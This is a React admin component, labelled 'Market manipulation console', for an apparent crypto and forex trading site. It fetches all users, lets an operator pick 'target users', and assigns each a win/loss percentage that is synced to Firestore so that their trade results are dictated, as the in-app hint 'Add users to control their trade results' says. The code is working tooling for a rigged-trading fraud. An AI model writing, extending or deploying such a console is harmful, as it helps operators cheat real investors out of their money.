import React, { useState, useEffect } from 'react';
import { db } from '../../firebase-setup';
import { doc, getDoc, setDoc, collection, getDocs, onSnapshot, deleteField } from 'firebase/firestore';
import { X, Search, ChevronUp, ChevronDown, Users, Zap, BarChart2, Shield, Check } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

/* ─────────────────────────────────────────────────────────
   Toast
───────────────────────────────────────────────────────── */
const Toast = ({ show, message, type = 'success' }) => (
    <AnimatePresence>
        {show && (
            <motion.div
                initial={{ opacity: 0, y: 30, scale: 0.95 }}
                animate={{ opacity: 1, y: 0, scale: 1 }}
                exit={{ opacity: 0, y: 30, scale: 0.95 }}
                transition={{ type: 'spring', damping: 20, stiffness: 300 }}
                style={{
                    position: 'fixed', bottom: '32px', left: '50%', transform: 'translateX(-50%)', zIndex: 9999,
                    display: 'flex', alignItems: 'center', gap: '10px',
                    padding: '12px 18px', borderRadius: '14px',
                    background: type === 'success' ? 'rgba(0,192,135,0.12)' : 'rgba(255,77,79,0.12)',
                    border: `1px solid ${type === 'success' ? 'rgba(0,192,135,0.35)' : 'rgba(255,77,79,0.35)'}`,
                    backdropFilter: 'blur(20px)',
                    boxShadow: `0 8px 32px ${type === 'success' ? 'rgba(0,192,135,0.15)' : 'rgba(255,77,79,0.15)'}`,
                }}
            >
                <div style={{
                    width: '22px', height: '22px', borderRadius: '50%', flexShrink: 0,
                    background: type === 'success' ? '#00c087' : '#ff4d4f',
                    display: 'flex', alignItems: 'center', justifyContent: 'center'
                }}>
                    <Check size={13} color="#000" strokeWidth={3} />
                </div>
                <span style={{ fontSize: '13px', fontWeight: '700', color: '#fff' }}>{message}</span>
            </motion.div>
        )}
    </AnimatePresence>
);

/* ─────────────────────────────────────────────────────────
   Spin Counter
───────────────────────────────────────────────────────── */
const SpinCounter = ({ value, onChange, min = 0, max = 999, step = 1, label, suffix = '', color = '#f0b90b', compact = false }) => {
    const inc = () => onChange(Math.min(max, parseFloat((parseFloat(value) + step).toFixed(2))));
    const dec = () => onChange(Math.max(min, parseFloat((parseFloat(value) - step).toFixed(2))));
    return (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '5px', flex: 1 }}>
            {label && <span style={{ fontSize: '10px', color: '#666', textTransform: 'uppercase', letterSpacing: '0.8px', fontWeight: '600' }}>{label}</span>}
            <div className="spin-wrap" style={{
                display: 'flex', alignItems: 'center',
                background: 'rgba(255,255,255,0.03)', border: '1px solid #1a1a1a',
                borderRadius: compact ? '10px' : '14px', padding: compact ? '6px 10px' : '11px 14px', gap: '8px'
            }}>
                <button type="button" onClick={dec} className="spin-btn"><ChevronDown size={13} /></button>
                <div style={{ display: 'flex', alignItems: 'baseline', gap: '3px', flex: 1, justifyContent: 'center' }}>
                    <input type="number" value={value} onChange={e => onChange(parseFloat(e.target.value) || 0)}
                        style={{ background: 'none', border: 'none', outline: 'none', color, fontSize: compact ? '14px' : '20px', fontWeight: '900', textAlign: 'center', width: '100%', fontVariantNumeric: 'tabular-nums' }} />
                    {suffix && <span style={{ fontSize: '11px', color: '#3a3a4a', flexShrink: 0 }}>{suffix}</span>}
                </div>
                <button type="button" onClick={inc} className="spin-btn"><ChevronUp size={13} /></button>
            </div>
        </div>
    );
};

/* ═══════════════════════════════════════════════════════════════════════════ */

const AdminSignals = () => {
    const [loading, setLoading] = useState(false);
    const [currentSignal, setCurrentSignal] = useState(null);
    const [fetching, setFetching] = useState(true);
    const [toast, setToast] = useState({ show: false, message: '', type: 'success' });

    const [globalWinLossRate, setGlobalWinLossRate] = useState(5);
    const [selectedSymbol, setSelectedSymbol] = useState('BTC/USDT');
    const [affectedUsers, setAffectedUsers] = useState({});
    const [users, setUsers] = useState([]);
    const [searchTerm, setSearchTerm] = useState('');
    const [showUserModal, setShowUserModal] = useState(false);

    const ALL_SYMBOLS = ['BTC/USDT', 'ETH/USDT', 'SOL/USDT', 'XRP/USDT', 'EUR/USD', 'GBP/USD', 'USD/JPY', 'AUD/USD', 'XAU/USD', 'XAG/USD', 'XPT/USD'];

    const showToast = (message, type = 'success') => {
        setToast({ show: true, message, type });
        setTimeout(() => setToast(t => ({ ...t, show: false })), 3000);
    };

    useEffect(() => {
        const fetchAll = async () => {
            try {
                const signalSnap = await getDoc(doc(db, 'admin_set', 'market_signal'));
                if (signalSnap.exists()) {
                    const data = signalSnap.data();
                    setCurrentSignal(data);
                    setSelectedSymbol(data.symbol || 'BTC/USDT');
                    if (data.affectedUsersMap) {
                        const migratedMap = {};
                        Object.keys(data.affectedUsersMap).forEach(uid => {
                            const u = data.affectedUsersMap[uid];
                            let finalRate = u.winLossPercentage;
                            if (finalRate === undefined) {
                                if (u.winLossRate !== undefined) finalRate = u.winLossRate;
                                else if (u.winPercent !== undefined) finalRate = u.winPercent;
                            }
                            migratedMap[uid] = { name: u.name || 'Anonymous', email: u.email || '', winLossPercentage: finalRate };
                        });
                        setAffectedUsers(migratedMap);
                    }
                    if (data.globalWinPercent !== undefined && data.globalWinLossRate === undefined) {
                        setGlobalWinLossRate(data.globalWinPercent);
                    } else if (data.globalWinLossRate !== undefined) {
                        setGlobalWinLossRate(data.globalWinLossRate);
                    }
                }
                const usersSnap = await getDocs(collection(db, 'users'));
                setUsers(usersSnap.docs.map(d => ({ id: d.id, ...d.data() })));
            } catch (err) { console.error(err); }
            finally { setFetching(false); }
        };
        fetchAll();
        const unsub = onSnapshot(doc(db, 'admin_set', 'market_signal'), snap => {
            if (snap.exists() && !showUserModal) { setCurrentSignal(snap.data()); }
        });
        return () => unsub();
    }, []);

    // Real-time sync to Firestore while signal is active
    useEffect(() => {
        if (currentSignal?.isActive) {
            import('firebase/firestore').then(({ updateDoc }) => {
                updateDoc(doc(db, 'admin_set', 'market_signal'), {
                    affectedUsersMap: affectedUsers,
                    globalWinLossRate: parseInt(globalWinLossRate) || 0,
                    globalWinPercent: deleteField(),
                    updatedAt: new Date().toISOString()
                }).catch(err => console.error('Error syncing live config:', err));
            });
        }
    }, [affectedUsers, globalWinLossRate, currentSignal?.isActive]);

    const addUserToSignal = user => setAffectedUsers(prev => ({ ...prev, [user.id]: { winLossPercentage: globalWinLossRate, name: user.name || 'Anonymous', email: user.email } }));
    const removeUserFromSignal = uid => setAffectedUsers(prev => { const n = { ...prev }; delete n[uid]; return n; });
    const updateUserRate = (uid, field, val) => {
        const parsed = parseInt(val);
        setAffectedUsers(prev => ({ ...prev, [uid]: { ...prev[uid], [field]: isNaN(parsed) ? 0 : parsed } }));
    };
    const applyGlobalToAll = () => {
        const val = parseInt(globalWinLossRate);
        const next = {};
        Object.keys(affectedUsers).forEach(id => { next[id] = { ...affectedUsers[id], winLossPercentage: isNaN(val) ? 0 : val }; });
        setAffectedUsers(next);
    };

    const saveConfiguration = async () => {
        setLoading(true);
        try {
            const signalData = {
                direction: 'UP',
                symbol: selectedSymbol,
                globalWinLossRate: parseInt(globalWinLossRate) || 0,
                isActive: true,
                affectedUsersMap: affectedUsers,
                updatedAt: new Date().toISOString()
            };
            await setDoc(doc(db, 'admin_set', 'market_signal'), signalData);
            setCurrentSignal(signalData);
            showToast('Configuration saved successfully!', 'success');
        } catch (err) {
            console.error(err);
            showToast('Failed to save: ' + err.message, 'error');
        } finally { setLoading(false); }
    };

    const clearSignal = async () => {
        setLoading(true);
        try {
            await setDoc(doc(db, 'admin_set', 'market_signal'), { isActive: false, expiresAt: new Date().toISOString() }, { merge: true });
            setCurrentSignal(null);
            showToast('Signal cleared.', 'success');
        } catch (err) { showToast('Failed: ' + err.message, 'error'); }
        finally { setLoading(false); }
    };

    const filteredUsers = users.filter(u =>
        u.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        u.email?.toLowerCase().includes(searchTerm.toLowerCase())
    );

    if (fetching) return (
        <div style={{ minHeight: '100vh', background: '#000', padding: '32px', fontFamily: "'Inter', sans-serif" }}>
            <div style={{ maxWidth: '1140px', margin: '0 auto' }}>
                {['280px,36px', '180px,16px'].map((s, i) => { const [w, h] = s.split(','); return <div key={i} className="skel" style={{ width: w, height: h, borderRadius: '8px', marginBottom: i === 0 ? '8px' : '40px' }} />; })}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
                    {[520, 620].map((h, i) => <div key={i} className="skel" style={{ height: h, borderRadius: '24px' }} />)}
                </div>
            </div>
            <style>{`.skel{background:linear-gradient(90deg,#0a0a12 25%,#111120 50%,#0a0a12 75%);background-size:200% 100%;animation:sh 1.5s infinite linear;}@keyframes sh{from{background-position:-200% 0}to{background-position:200% 0}}`}</style>
        </div>
    );

    return (
        <div style={{ minHeight: '100vh', background: '#000', color: '#fff', fontFamily: "'Inter', sans-serif" }}>

            <Toast show={toast.show} message={toast.message} type={toast.type} />

            {/* ══ TOP NAV BAR ══ */}
            <div style={{
                borderBottom: '1px solid #1a1a1a', padding: '14px 28px',
                display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(20px)',
                position: 'sticky', top: 0, zIndex: 100
            }}>
                {/* Left: Logo + Title */}
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                    <div style={{
                        width: '34px', height: '34px', borderRadius: '10px',
                        background: 'linear-gradient(135deg, #f0b90b22, #f0b90b08)',
                        border: '1px solid #f0b90b30', display: 'flex', alignItems: 'center', justifyContent: 'center'
                    }}>
                        <BarChart2 size={15} color="#f0b90b" />
                    </div>
                    <div>
                        <h1 style={{ fontSize: '16px', fontWeight: '800', letterSpacing: '-0.3px', margin: 0, background: 'linear-gradient(90deg, #ffffff, #aaaacc)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Trade Control</h1>
                        <p style={{ color: '#555', fontSize: '10px', margin: 0 }}>Market manipulation console</p>
                    </div>
                </div>

                {/* Right: Save button */}
                <motion.button
                    whileHover={{ scale: 1.03, boxShadow: '0 6px 24px rgba(240,185,11,0.3)' }}
                    whileTap={{ scale: 0.97 }}
                    onClick={saveConfiguration}
                    disabled={loading}
                    style={{
                        display: 'flex', alignItems: 'center', gap: '7px',
                        padding: '9px 20px',
                        background: loading ? 'rgba(240,185,11,0.15)' : 'linear-gradient(135deg, #f0b90b, #d4a017)',
                        color: loading ? '#f0b90b' : '#000',
                        border: loading ? '1px solid rgba(240,185,11,0.3)' : 'none',
                        borderRadius: '12px', fontWeight: '800', fontSize: '13px',
                        cursor: loading ? 'not-allowed' : 'pointer',
                        letterSpacing: '0.3px', opacity: loading ? 0.8 : 1,
                        transition: 'all 0.2s'
                    }}
                >
                    {loading
                        ? <><span style={{ width: '13px', height: '13px', border: '2px solid #f0b90b', borderTopColor: 'transparent', borderRadius: '50%', display: 'inline-block', animation: 'spin 0.7s linear infinite' }} /> Saving…</>
                        : <><Zap size={14} /> Save</>
                    }
                </motion.button>
            </div>

            {/* ══ MAIN CONTENT ══ */}
            <div style={{ padding: '28px', maxWidth: '1140px', margin: '0 auto' }}>
                <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0,1fr) minmax(0,1fr)', gap: '20px', alignItems: 'start' }}>

                    {/* ── LEFT: Config Card ── */}
                    <div style={{
                        background: '#0a0a0a', border: '1px solid #1a1a1a', borderRadius: '20px',
                        padding: '24px', display: 'flex', flexDirection: 'column', gap: '20px',
                        position: 'relative', overflow: 'hidden'
                    }}>
                        <div style={{ position: 'absolute', top: 0, right: 0, width: '100px', height: '100px', background: 'radial-gradient(circle, rgba(240,185,11,0.06) 0%, transparent 70%)', pointerEvents: 'none' }} />

                        {/* Section label */}
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                            <Shield size={13} color="#f0b90b" />
                            <span style={{ fontSize: '10px', fontWeight: '700', color: '#666', textTransform: 'uppercase', letterSpacing: '1.2px' }}>Signal Configuration</span>
                        </div>

                        {/* Target Asset */}
                        <div>
                            <p style={{ fontSize: '10px', color: '#555', marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.8px', fontWeight: '600' }}>Target Asset</p>
                            <div style={{ position: 'relative' }}>
                                <select
                                    value={selectedSymbol}
                                    onChange={e => setSelectedSymbol(e.target.value)}
                                    style={{
                                        width: '100%', padding: '13px 42px 13px 16px',
                                        background: '#000', color: '#fff',
                                        border: '1px solid #222', borderRadius: '12px',
                                        fontSize: '15px', fontWeight: '800', cursor: 'pointer',
                                        appearance: 'none', outline: 'none', letterSpacing: '0.3px'
                                    }}
                                >
                                    {ALL_SYMBOLS.map(s => <option key={s} value={s}>{s}</option>)}
                                </select>
                                <ChevronDown size={14} color="#555" style={{ position: 'absolute', right: '14px', top: '50%', transform: 'translateY(-50%)', pointerEvents: 'none' }} />
                            </div>
                        </div>

                        {/* Info note */}
                        <div style={{ padding: '12px 16px', background: 'rgba(240,185,11,0.04)', border: '1px solid rgba(240,185,11,0.1)', borderRadius: '12px' }}>
                            <p style={{ fontSize: '11px', color: '#666', margin: 0, lineHeight: 1.6 }}>
                                Set each user's <span style={{ color: '#f0b90b', fontWeight: '700' }}>Win/Loss %</span> on the right panel.<br />
                                Positive = profit · Negative = loss · Press <span style={{ color: '#f0b90b', fontWeight: '700' }}>Save</span> to apply.
                            </p>
                        </div>
                    </div>

                    {/* ── RIGHT: Users Panel ── */}
                    <div style={{
                        background: '#0a0a0a', border: '1px solid #1a1a1a', borderRadius: '20px',
                        padding: '24px', display: 'flex', flexDirection: 'column', minHeight: '500px',
                        position: 'relative', overflow: 'hidden'
                    }}>
                        <div style={{ position: 'absolute', bottom: 0, right: 0, width: '140px', height: '140px', background: 'radial-gradient(circle, rgba(240,185,11,0.04) 0%, transparent 70%)', pointerEvents: 'none' }} />

                        {/* Header */}
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '20px' }}>
                            <div>
                                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
                                    <Users size={13} color="#f0b90b" />
                                    <span style={{ fontSize: '10px', fontWeight: '700', color: '#666', textTransform: 'uppercase', letterSpacing: '1.2px' }}>Targeted Users</span>
                                </div>
                                <div style={{ display: 'flex', alignItems: 'baseline', gap: '6px' }}>
                                    <span style={{ fontSize: '28px', fontWeight: '900', color: '#fff', lineHeight: 1 }}>{Object.keys(affectedUsers).length}</span>
                                    <span style={{ fontSize: '12px', color: '#555' }}>targets</span>
                                </div>
                            </div>
                            <motion.button
                                whileHover={{ scale: 1.04 }} whileTap={{ scale: 0.97 }}
                                onClick={() => setShowUserModal(true)}
                                style={{ display: 'flex', alignItems: 'center', gap: '5px', padding: '8px 14px', background: 'rgba(240,185,11,0.08)', color: '#f0b90b', border: '1px solid rgba(240,185,11,0.2)', borderRadius: '10px', fontSize: '12px', fontWeight: '800', cursor: 'pointer' }}
                            >
                                + Add
                            </motion.button>
                        </div>

                        {/* Global batch row */}
                        <div style={{ display: 'flex', gap: '10px', marginBottom: '16px', padding: '14px', background: 'rgba(255,255,255,0.02)', borderRadius: '14px', border: '1px solid #1a1a1a', alignItems: 'flex-end' }}>
                            <SpinCounter value={globalWinLossRate} onChange={setGlobalWinLossRate} min={-100} max={500} step={1} label="Default Win/Loss %" suffix="%" color={globalWinLossRate >= 0 ? '#00c087' : '#ff4d4f'} compact />
                            <motion.button
                                whileTap={{ scale: 0.96 }}
                                onClick={applyGlobalToAll}
                                style={{ padding: '0 12px', background: 'rgba(240,185,11,0.08)', border: '1px solid rgba(240,185,11,0.2)', borderRadius: '10px', color: '#f0b90b', fontSize: '10px', fontWeight: '800', cursor: 'pointer', whiteSpace: 'nowrap', height: '40px', letterSpacing: '0.5px' }}
                            >
                                APPLY ALL
                            </motion.button>
                        </div>

                        <div style={{ height: '1px', background: 'linear-gradient(90deg, transparent, #1a1a1a, transparent)', marginBottom: '14px' }} />

                        {/* User list */}
                        <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                            <AnimatePresence>
                                {Object.entries(affectedUsers).map(([id, u], idx) => (
                                    <motion.div
                                        key={id}
                                        initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, x: -20 }} transition={{ delay: idx * 0.04 }}
                                        style={{ padding: '12px 14px', background: 'rgba(255,255,255,0.02)', border: '1px solid #1a1a1a', borderRadius: '14px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '10px' }}
                                    >
                                        {/* Avatar + info */}
                                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flex: 1, minWidth: 0 }}>
                                            <div style={{ width: '36px', height: '36px', background: '#1a1a1a', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', fontWeight: '900', color: '#f0b90b', flexShrink: 0, border: '1px solid #2a2a2a' }}>
                                                {(u.name?.[0] || '?').toUpperCase()}
                                            </div>
                                            <div style={{ minWidth: 0 }}>
                                                <p style={{ fontSize: '13px', fontWeight: '700', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', margin: 0 }}>{u.name}</p>
                                                <p style={{ fontSize: '10px', color: '#555', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', margin: 0 }}>{u.email}</p>
                                            </div>
                                        </div>

                                        {/* Win/Loss control */}
                                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexShrink: 0 }}>
                                            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '2px' }}>
                                                <span style={{ fontSize: '8px', color: '#555', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Win/Loss %</span>
                                                <div style={{ display: 'flex', alignItems: 'center', gap: '2px', background: '#000', border: `1px solid ${(parseInt(u.winLossPercentage) || 0) >= 0 ? 'rgba(0,192,135,0.2)' : 'rgba(255,77,79,0.2)'}`, borderRadius: '8px', padding: '3px 6px' }}>
                                                    <button type="button" onClick={() => updateUserRate(id, 'winLossPercentage', Math.max(-100, (parseInt(u.winLossPercentage) || 0) - 1))} style={{ background: 'none', border: 'none', color: '#555', cursor: 'pointer', padding: 0 }}><ChevronDown size={11} /></button>
                                                    <input
                                                        type="number"
                                                        value={u.winLossPercentage || 0}
                                                        onChange={e => updateUserRate(id, 'winLossPercentage', e.target.value)}
                                                        style={{ width: '36px', background: 'none', border: 'none', outline: 'none', color: (parseInt(u.winLossPercentage) || 0) >= 0 ? '#00c087' : '#ff4d4f', fontSize: '13px', fontWeight: '900', textAlign: 'center' }}
                                                    />
                                                    <button type="button" onClick={() => updateUserRate(id, 'winLossPercentage', Math.min(500, (parseInt(u.winLossPercentage) || 0) + 1))} style={{ background: 'none', border: 'none', color: '#555', cursor: 'pointer', padding: 0 }}><ChevronUp size={11} /></button>
                                                </div>
                                            </div>
                                            <button
                                                onClick={() => removeUserFromSignal(id)}
                                                style={{ padding: '6px', background: 'rgba(255,77,79,0.06)', border: '1px solid rgba(255,77,79,0.15)', borderRadius: '8px', color: '#ff4d4f', cursor: 'pointer', display: 'flex', alignItems: 'center' }}
                                            >
                                                <X size={12} />
                                            </button>
                                        </div>
                                    </motion.div>
                                ))}
                            </AnimatePresence>

                            {Object.keys(affectedUsers).length === 0 && (
                                <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: '12px', padding: '50px 0' }}>
                                    <div style={{ width: '56px', height: '56px', borderRadius: '18px', background: 'rgba(255,255,255,0.02)', border: '1px dashed #222', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                        <Users size={26} color="#333" />
                                    </div>
                                    <div style={{ textAlign: 'center' }}>
                                        <p style={{ fontSize: '14px', fontWeight: '700', color: '#333', margin: 0 }}>No targets yet</p>
                                        <p style={{ fontSize: '11px', color: '#2a2a2a', marginTop: '4px' }}>Add users to control their trade results</p>
                                    </div>
                                    <motion.button
                                        whileHover={{ scale: 1.03 }} whileTap={{ scale: 0.97 }}
                                        onClick={() => setShowUserModal(true)}
                                        style={{ padding: '9px 20px', background: 'rgba(240,185,11,0.07)', border: '1px solid rgba(240,185,11,0.18)', borderRadius: '10px', color: '#f0b90b', fontSize: '12px', fontWeight: '800', cursor: 'pointer' }}
                                    >
                                        + Add Targets
                                    </motion.button>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            </div>

            {/* ══ USER PICKER MODAL ══ */}
            <AnimatePresence>
                {showUserModal && (
                    <motion.div
                        initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                        style={{ position: 'fixed', inset: 0, zIndex: 1000, display: 'flex', alignItems: 'flex-end', justifyContent: 'center', background: 'rgba(0,0,0,0.88)', backdropFilter: 'blur(12px)' }}
                    >
                        <motion.div
                            initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }}
                            transition={{ type: 'spring', damping: 30, stiffness: 240 }}
                            style={{ width: '100%', maxWidth: '540px', background: '#0e0e0e', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px', border: '1px solid #1a1a1a', maxHeight: '80vh', overflowY: 'auto', boxShadow: '0 -40px 80px rgba(0,0,0,0.7)' }}
                        >
                            <div style={{ width: '32px', height: '4px', background: '#222', borderRadius: '4px', margin: '0 auto 20px' }} />

                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '18px' }}>
                                <div>
                                    <h3 style={{ fontSize: '18px', fontWeight: '900', margin: 0 }}>Select Target Users</h3>
                                    <p style={{ fontSize: '11px', color: '#555', marginTop: '3px' }}>{filteredUsers.length} users available</p>
                                </div>
                                <button onClick={() => setShowUserModal(false)} style={{ background: '#1a1a1a', border: 'none', padding: '9px', borderRadius: '50%', color: '#666', cursor: 'pointer', display: 'flex', alignItems: 'center' }}>
                                    <X size={16} />
                                </button>
                            </div>

                            <div style={{ position: 'relative', marginBottom: '16px' }}>
                                <Search size={13} style={{ position: 'absolute', left: '14px', top: '50%', transform: 'translateY(-50%)', color: '#444' }} />
                                <input
                                    type="text" placeholder="Search by name or email…"
                                    value={searchTerm} onChange={e => setSearchTerm(e.target.value)}
                                    style={{ width: '100%', padding: '11px 11px 11px 40px', background: '#000', border: '1px solid #1a1a1a', borderRadius: '12px', color: '#fff', fontSize: '13px', outline: 'none' }}
                                />
                            </div>

                            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                                {filteredUsers.map(u => {
                                    const isAdded = !!affectedUsers[u.id];
                                    return (
                                        <motion.div
                                            key={u.id} whileTap={{ scale: 0.985 }}
                                            onClick={() => isAdded ? removeUserFromSignal(u.id) : addUserToSignal(u)}
                                            style={{ padding: '12px 14px', background: isAdded ? 'rgba(240,185,11,0.05)' : '#111', border: `1px solid ${isAdded ? 'rgba(240,185,11,0.3)' : '#1a1a1a'}`, borderRadius: '14px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer', transition: 'all 0.18s' }}
                                        >
                                            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                                                <div style={{ width: '40px', height: '40px', background: '#1a1a1a', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '900', fontSize: '15px', color: isAdded ? '#f0b90b' : '#444', border: `1px solid ${isAdded ? 'rgba(240,185,11,0.25)' : '#222'}` }}>
                                                    {u.name?.[0]?.toUpperCase()}
                                                </div>
                                                <div>
                                                    <p style={{ fontWeight: '700', fontSize: '13px', margin: 0 }}>{u.name}</p>
                                                    <p style={{ fontSize: '11px', color: '#555', margin: 0 }}>{u.email}</p>
                                                </div>
                                            </div>
                                            <motion.div
                                                animate={{ scale: isAdded ? 1 : 0.85 }}
                                                style={{ width: '22px', height: '22px', borderRadius: '50%', background: isAdded ? '#f0b90b' : 'transparent', border: `2px solid ${isAdded ? '#f0b90b' : '#2a2a2a'}`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}
                                            >
                                                {isAdded && <span style={{ color: '#000', fontSize: '11px', fontWeight: '900' }}>✓</span>}
                                            </motion.div>
                                        </motion.div>
                                    );
                                })}
                            </div>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>

            <style>{`
                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
                @keyframes spin { to { transform: rotate(360deg); } }
                .spin-btn { background:rgba(255,255,255,0.04); border:1px solid #222; border-radius:7px; color:#4a4a6a; cursor:pointer; width:24px; height:24px; display:flex; align-items:center; justify-content:center; flex-shrink:0; transition:all 0.15s; }
                .spin-btn:hover { background:rgba(240,185,11,0.08); border-color:rgba(240,185,11,0.2); color:#f0b90b; }
                .spin-wrap:focus-within { border-color:#222 !important; }
                input[type=number]::-webkit-outer-spin-button,input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}
                input[type=number]{-moz-appearance:textfield;}
                *::-webkit-scrollbar{width:3px;}*::-webkit-scrollbar-track{background:transparent;}*::-webkit-scrollbar-thumb{background:#222;border-radius:10px;}
                select option{background:#0a0a0a;color:#fff;}
            `}</style>
        </div>
    );
};

export default AdminSignals;
